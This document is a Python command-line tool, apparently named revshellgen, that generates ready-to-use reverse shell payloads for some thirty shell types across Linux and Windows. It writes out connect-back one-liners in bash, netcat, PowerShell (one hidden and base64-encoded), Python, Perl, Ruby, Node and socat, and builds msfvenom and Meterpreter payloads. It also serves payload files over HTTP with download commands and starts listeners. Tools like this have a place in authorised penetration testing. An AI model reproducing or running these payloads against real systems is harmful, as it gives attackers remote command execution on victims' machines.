#!/usr/bin/env python3

from base64 import b64encode
from fcntl import ioctl
from os import getcwd, path
from random import randint
from shutil import which
from struct import pack
from urllib import parse

import argparse
import http.server
import re
import socket
import socketserver
import subprocess
import sys


def parse_options():
    parser = argparse.ArgumentParser(description="revshellgen -i 127.0.0.1 -p 4444 -t bash")
    parser.add_argument("-i",
                        "--ipaddr",
                        type=str,
                        default="127.0.0.1",
                        help="IP address or interface to connect back to")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Port to connect back to")
    parser.add_argument("-t",
                        "--type",
                        type=str,
                        help="Type of reverse shell to generate",
                        dest='shell_type')
    parser.add_argument("-e",
                        "--encode",
                        type=str,
                        help="Encode reverse shell",
                        choices=["base64", "url"])
    parser.add_argument("-l",
                        "--list",
                        action="store_true",
                        help="List available shell types",
                        dest='shell_list')
    parser.add_argument("-L",
                        "--listen",
                        action="store_true",
                        help="Start a listener",
                        dest="shell_listen")
    parser.add_argument("-s",
                        "--serve",
                        action="store_true",
                        help="Serve reverse shell",
                        dest="shell_serve")
    parser.add_argument("-P",
                        "--serve-port",
                        type=int,
                        default=randint(8000, 9000),
                        help="Serve reverse shell on specific port",
                        dest="shell_serve_port")
    args = parser.parse_args()

    if (args.shell_type == None) ^ args.shell_list:
        parser.print_help(sys.stderr)
        sys.exit(1)

    return args


def get_ip(ip_iface: str) -> str:
    # Check if valid ip address
    if re.match(r"(^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)", ip_iface):
        return ip_iface

    # Get ip address from interface
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip_iface = socket.inet_ntoa(
            ioctl(
                s.fileno(),
                0x8915,  # SIOCGIFADDR
                pack('256s', ip_iface[:15].encode()))[20:24])
        return ip_iface
    except Exception:
        pass

    # Check if valid domain
    if re.match(r"^((?!-)[A-Za-z0-9-]" + "{1,63}(?<!-)\\.)" + "+[A-Za-z]{2,6}", ip_iface):
        return ip_iface

    # If all checks fail, check if non-linux user using interface
    if sys.platform != "linux":
        print("[!] Inteface only supported on Linux", file=sys.stderr)
        sys.exit(1)

    # If is linux, it is invalid input
    print("[!] Invalid interface or domain", file=sys.stderr)
    sys.exit(1)


def get_shell(ipaddr: str, port: int) -> dict:
    PLAIN = 1
    GENERATE = 2

    aspx = {
        "description":
        "ASPX stageless reverse shell",
        "reverse":
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f aspx -o reverse.aspx" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Windows",
    }

    bash = {
        "description": "Bash reverse shell",
        "reverse": 'bash -c "bash -i >& /dev/tcp/%s/%d 0>&1"' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Linux",
    }

    java = {
        "description":
        "Java reverse shell",
        "reverse":
        'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor();'
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    jsp = {
        "description":
        "JSP stageless reverse shell",
        "reverse":
        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw -o reverse.jsp' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -luvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Generic",
    }

    linux = {
        "description":
        "Linux stageless reverse shell",
        "reverse":
        'msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Linux",
    }

    linux32 = {
        "description":
        "32-bit Linux stageless reverse shell",
        "reverse":
        'msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Linux",
    }

    linux_meterpreter = {
        "description":
        "Linux stageless meterpreter reverse shell",
        "reverse":
        'msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
        % (port),
        "type":
        GENERATE,
        "platform":
        "Linux",
    }

    linux32_meterpreter = {
        "description":
        "32-bit Linux stageless meterpreter reverse shell",
        "reverse":
        'msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
        % (port),
        "type":
        GENERATE,
        "platform":
        "Linux",
    }

    netcat = {
        "description": "Netcat reverse shell",
        "reverse": 'nc %s %d -e /bin/bash' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Linux",
    }

    netcat_mkfifo = {
        "description": "Netcat mkfifo reverse shell",
        "reverse":
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Linux",
    }

    netcat_windows = {
        "description": "Windows Netcat reverse shell",
        "reverse": "nc.exe -e powershell.exe %s %d" % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Windows",
    }

    ncat = {
        "description": "Ncat reverse shell",
        "reverse": 'ncat %s %d -e /bin/bash' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Linux",
    }

    ncat_udp = {
        "description":
        "Ncat UDP reverse shell",
        "reverse":
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u %s %d >/tmp/f' % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -luvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    ncat_windows = {
        "description": "Windows Ncat reverse shell",
        "reverse": "ncat.exe %s %d -e powershell.exe" % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
        "type": PLAIN,
        "platform": "Windows",
    }

    node = {
        "description":
        "NodeJS reverse shell",
        "reverse":
        "node -e \'!function(){var n=require(\"net\"),e=require(\"child_process\").spawn(\"bash\",[]),t=new n.Socket;t.connect(%d,\"%s\",function(){t.pipe(e.stdin),e.stdout.pipe(t),e.stderr.pipe(t)})}();\'"
        % (port, ipaddr),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    perl = {
        "description":
        "Perl reverse shell",
        "reverse":
        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\''
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    perl_windows = {
        "description":
        "Windows Perl reverse shell",
        "reverse":
        'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Windows",
    }

    php = {
        "description":
        "PHP reverse shell",
        "reverse":
        "msfvenom -p php/reverse_php LHOST=%s LPORT=%d -o reverse.php"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Generic",
    }

    powershell = {
        "description":
        "Powershell reverse shell",
        "reverse":
        "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | %% {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Windows",
    }

    powershell_b64 = {
        "description":
        "Encoded Powershell reverse shell",
        "reverse":
        'powershell -e ' + b64encode((
            '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
            % (ipaddr, port)).encode('utf16')[2:]).decode(),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Windows",
    }

    python = {
        "description":
        "Python reverse shell",
        "reverse":
        "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%d));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    python_windows = {
        "description":
        "Windows Python reverse shell",
        "reverse":
        "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'%s\',%d));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Windows",
    }

    ruby = {
        "description":
        "Ruby reverse shell",
        "reverse":
        "ruby -rsocket -e\'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    ruby_windows = {
        "description":
        "Ruby reverse shell",
        "reverse":
        "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\"%s\",\"%d\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Windows",
    }

    socat = {
        "description": "Socat reverse shell",
        "reverse": "socat TCP:%s:%d EXEC:'bash',pty,stderr,setsid,sigint,sane" % (ipaddr, port),
        "listen": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:%d" % (port),
        "type": PLAIN,
        "platform": "Linux",
    }

    telnet = {
        "description":
        "Telnet reverse shell",
        "reverse":
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|telnet %s %d > /tmp/f" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        PLAIN,
        "platform":
        "Linux",
    }

    war = {
        "description":
        "War stageless reverse shell",
        "reverse":
        "msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o reverse.war" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Generic",
    }

    windows = {
        "description":
        "Windows stageless reverse shell",
        "reverse":
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Windows",
    }

    windows32 = {
        "description":
        "32-bit Windows stageless reverse shell",
        "reverse":
        "msfvenom -p windows/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
        "type":
        GENERATE,
        "platform":
        "Windows",
    }

    windows_meterpreter = {
        "description":
        "Windows stageless meterpreter reverse shell",
        "reverse":
        "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
        % (port),
        "type":
        GENERATE,
        "platform":
        "Windows",
    }

    windows32_meterpreter = {
        "description":
        "32-bit Windows stageless meterpreter reverse shell",
        "reverse":
        "msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload windows/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
        % (port),
        "type":
        GENERATE,
        "platform":
        "Windows",
    }

    shells = {
        "aspx": aspx,
        "bash": bash,
        "java": java,
        "jsp": jsp,
        "lin": linux,
        "lin32": linux32,
        "lin-met": linux_meterpreter,
        "lin32-met": linux32_meterpreter,
        "nc": netcat,
        "nc-mkfifo": netcat_mkfifo,
        "nc-win": netcat_windows,
        "ncat": ncat,
        "ncat-udp": ncat_udp,
        "ncat-win": ncat_windows,
        "node": node,
        "perl": perl,
        "perl-win": perl_windows,
        "php": php,
        "ps": powershell,
        "ps-b64": powershell_b64,
        "py": python,
        "py-win": python_windows,
        "ruby": ruby,
        "ruby-win": ruby_windows,
        "socat": socat,
        "telnet": telnet,
        "war": war,
        "win": windows,
        "win32": windows32,
        "win-met": windows_meterpreter,
        "win32-met": windows32_meterpreter,
    }

    return shells


def copy_clipboard(contents: str) -> None:
    if which("xclip"):
        proc = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE)
        proc.communicate(input=contents.encode())
        return

    contents = b64encode(contents.encode()).decode()
    subprocess.run(f"printf '\\e]52;c;{contents}\007'", shell=True)


def generate_msf(command: str) -> str:
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return command.split(" -o ")[1]


def serve_reverse(ipaddr: str, port: int, file_path: str) -> None:

    class SingleRequestHandler(http.server.SimpleHTTPRequestHandler):

        def translate_path(self, _):
            return file_path

        def log_message(self, *_):
            print(f"[+] File {path.basename(file_path)} downloaded!")

        def finish(self):
            self.connection.close()

    with socketserver.TCPServer((ipaddr, port), SingleRequestHandler, False) as httpd:
        httpd.allow_reuse_address = True
        httpd.server_bind()
        httpd.server_activate()

        try:
            httpd.handle_request()
        except KeyboardInterrupt:
            pass


def run_listener(command: str) -> None:
    try:
        process = subprocess.Popen(command, shell=True)
        process.wait()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(e, file=sys.stderr)
        sys.exit(1)


def encode_reverse(command: str, encoder: str) -> str:
    if encoder == "base64":
        return b64encode(command.encode()).decode()

    if encoder == "url":
        return parse.quote(command, safe='')

    return command


def main(args: argparse.Namespace) -> None:
    if args.shell_list:
        print("[+] List of shells")
        shells = get_shell("", -1)
        for shell in shells:
            print(f"{shell:<12}{shells[shell]['description']:<53}{shells[shell]['platform']}")

        return

    ipaddr = get_ip(args.ipaddr)
    port = args.port

    shells = get_shell(ipaddr, port)

    if args.shell_type not in shells:
        print("[!] Shell type not available", file=sys.stderr)
        sys.exit(1)

    shell = shells[args.shell_type]

    # Reverse shell
    print("[*] Generate reverse shell")

    file_path = ""
    match shell["type"]:
        case 1:
            # Copy reverse shell to clipboard
            copy_clipboard(shell['reverse'])
            print("[+] Contents copied to clipboard")
        case 2:
            # Generate binary and copy path to clipboard
            file_path = generate_msf(shell['reverse'])
            file_path = f"{getcwd()}/{file_path}"
            copy_clipboard(file_path)
            print(f"[+] Path {file_path} copied to clipboard")
        case _:
            # Write reverse shell to file
            file_path = f"{getcwd()}/reverse.{shell['type']}"
            with open(file_path, 'w') as f:
                f.write(shell['reverse'])

            copy_clipboard(file_path)
            print(f"[+] Path {file_path} copied to clipboard")

    if args.encode:
        shell['reverse'] = encode_reverse(shell['reverse'], args.encode)
        copy_clipboard(shell['reverse'])

    print(shell['reverse'])

    # Serve file on web
    if shell['type'] == 1 and args.shell_serve:
        print(f"\n[!] File served not supported for this reverse shell")

    if shell['type'] != 1 and args.shell_serve:
        serve_port = args.shell_serve_port

        print(f"\n[+] Reverse shell served on {serve_port}")

        # Prints and copies the command to get the file
        if shell['platform'] != "Linux":
            download_cmd = f"Invoke-WebRequest -Uri http://{ipaddr}:{serve_port} -OutFile {path.basename(file_path)}"
            copy_clipboard(download_cmd)
            print(download_cmd)

        if shell['platform'] != "Windows":
            download_cmd = f"curl -fsSL http://{ipaddr}:{serve_port} -o {path.basename(file_path)}"
            copy_clipboard(download_cmd)
            print(download_cmd)

        print("[+] Command copied to clipboard")

        serve_reverse(ipaddr, serve_port, file_path)

    # Listener
    print("\n[*] Start listener")
    print(shell["listen"])

    if args.shell_listen:
        # Starts an interactive listener
        print(f"\n[+] Listening on {port}")
        run_listener(shell["listen"])


if __name__ == "__main__":
    args = parse_options()
    main(args)
